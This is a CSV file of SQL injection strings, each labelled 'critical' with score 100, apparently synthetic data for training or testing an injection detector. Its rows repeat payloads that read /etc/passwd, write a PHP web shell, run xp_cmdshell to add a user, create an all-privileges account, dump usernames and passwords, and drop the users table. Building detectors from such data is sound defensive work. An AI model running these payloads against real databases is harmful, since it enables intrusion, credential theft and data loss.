query,risk,score
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 5zq0x6w,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- j1dl1f,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ # ea,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ /**/ -- h,critical,100
'; SELECT load_file('/etc/passwd'); # -- nset3h,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; SELECT * FROM mysql.user; -- # tess9l7,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # gabjnp3",critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # # irqfwc2,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ /**/",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 05yof6o,critical,100
'; SELECT * FROM mysql.user; -- -- 1o0mk9,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 1z2tc9z,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # jm5gqeu,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- haf5r9",critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 000rjls,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 # ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # ypoxdtr",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 7c0839,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # 9d,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1 -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # lpslro8,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # n6640fy,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # u8zi8vw",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ -- 2,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- 6iymm5,critical,100
'; SELECT * FROM mysql.user; -- # 74slya7,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ -- d,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # a8u5f3k,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ # 4u,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # y52501i",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; SELECT * FROM mysql.user; -- -- jvxa0d,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 1n484by,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- c998o1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- hv5fzr,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- zdz48o",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # si,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- LIMIT 1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1 -- ",critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ -- jfj0es,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # j8kxw4y,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 0q0x45x,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 5oteim,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # ogmp86i,critical,100
'; DROP TABLE users; -- /* test */ # us6ncf8,critical,100
'; DROP TABLE users; -- /* test */ -- 32vmnz,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ -- o,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 080iay2,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- zed57a",critical,100
'; DROP TABLE users; -- /* test */ -- mdowq7,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- 4dvk68,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ /**/",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- txcivj,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- hutqso,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ -- y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1 -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ -- 0,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- 9iukx0,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1 -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- y8mnux,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ -- y,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 6viulr9,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ # jsogmw1,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # yh3gnvh,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # o73ziae",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # kigdo0v,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # y3cb09e,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- wobsly,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1 -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # hwz6jlq,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- LIMIT 1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 7lyqkvr,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- 4lf4i9",critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ /**/,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # zqki0y0,critical,100
'; DROP TABLE users; -- /* test */ /**/ /**/,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ # dldp7n7,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # nx09vkp,critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ -- v,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ /**/ /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ # 4l,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 7yj9t27,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- go7sgu",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 6vxp6bv,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # dcf9o8d,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- /**/ # lr,critical,100
'; DROP TABLE users; -- /* test */ /**/ # hk,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ -- g",critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1 -- ",critical,100
'; SELECT * FROM mysql.user; -- -- 9qdpty,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # 7m,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # glvz2fq,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # nw6rf14,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # 0f,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- lhx00o",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- w64ibq,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- mlp3p6,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ /**/",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # x0w72ay",critical,100
'; DROP TABLE users; -- /* test */ AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- gixg57,critical,100
'; SELECT load_file('/etc/passwd'); # -- emthhn,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # qthqvdk,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ /**/,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- # uel3a79,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 5t9au0s,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- y0xbpt",critical,100
'; SELECT * FROM mysql.user; -- LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 # ",critical,100
'; SELECT load_file('/etc/passwd'); # # 1jbvmtx,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- LIMIT 1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # oy,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ -- v",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 3t4n21,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- h5mpen,critical,100
'; DROP TABLE users; -- /* test */ AND 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- jd3ume,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- AND 1=1 -- ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 9xe09gy,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- /**/ -- v,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # l01o7tn,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 1lzlu2x,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # r9m70fa,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- g2hwst",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # nkipn4o,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ /**/,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- 71t9s3,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # rh,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # rc99o12",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # rl5fhl9,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # vw8vp7d,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ /**/ /**/,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- sx6ny4,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # asip8bb,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- 74tjwf",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- yy01nz,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # q3iovwe",critical,100
